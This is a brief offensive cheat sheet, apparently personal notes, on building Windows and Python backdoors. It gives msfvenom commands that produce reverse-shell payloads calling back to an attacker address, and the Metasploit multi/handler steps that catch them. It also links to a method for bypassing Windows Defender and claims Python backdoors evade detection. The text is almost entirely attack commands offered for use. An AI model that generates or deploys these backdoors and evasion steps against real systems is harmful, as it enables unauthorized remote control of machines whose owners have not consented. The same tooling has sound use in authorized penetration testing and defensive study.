Windows Backdoors:

Payloads: (No chance beacause of windows defender)

$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.110 LPORT=4242 -f exe > reverse.exe<br>
$ msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.110" LPORT=4242 -f raw > shell.py

Working exploit that avoids windows defender:<br>
https://ired.team/offensive-security/defense-evasion/bypassing-windows-defender-one-tcp-socket-away-from-meterpreter-and-cobalt-strike-beacon

Host:
<br>
msfconsole<br>
use exploit/multi/handler<br>
set payload windows/meterpreter/reverse_tcp<br>
set LHOST [ip]<br>
set LPORT [port]<br>
exploit<br>
<br>
Python backdoors are safer, as they are not seen by windows defender. THere is always a risk with the firewall though.
